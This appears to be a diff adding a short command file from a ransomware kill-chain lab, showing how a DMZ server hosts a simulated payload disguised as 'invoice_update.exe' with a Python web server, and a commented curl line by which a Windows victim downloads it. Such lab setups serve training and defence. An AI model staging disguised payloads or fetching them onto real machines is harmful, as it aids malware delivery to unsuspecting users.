@@ -1,0 +1,22 @@
+# dmz_server_commands.txt
+# Description:
+#  Commands used on the Ubuntu DMZ server (10.10.20.10)
+#  to host a simulated malicious payload for the ransomware kill chain lab.
+
+# 1. Navigate to the directory where the payload is stored
+cd ~/dmz_payloads
+
+# 2. List files in the directory (should include invoice_update.exe or similar)
+ls -l
+
+# Example output (for reference):
+# -rw-r--r-- 1 ubuntu ubuntu   24576 Nov 28 15:32 invoice_update.exe
+
+# 3. Start a Python HTTP server on port 8080
+python3 -m http.server 8080
+
+# The DMZ server is now accessible from the LAN as:
+#   http://10.10.20.10:8080/invoice_update.exe
+
+# This URL is used by the Windows victim to download the simulated payload:
+#   curl http://10.10.20.10:8080/invoice_update.exe -O malware.exe
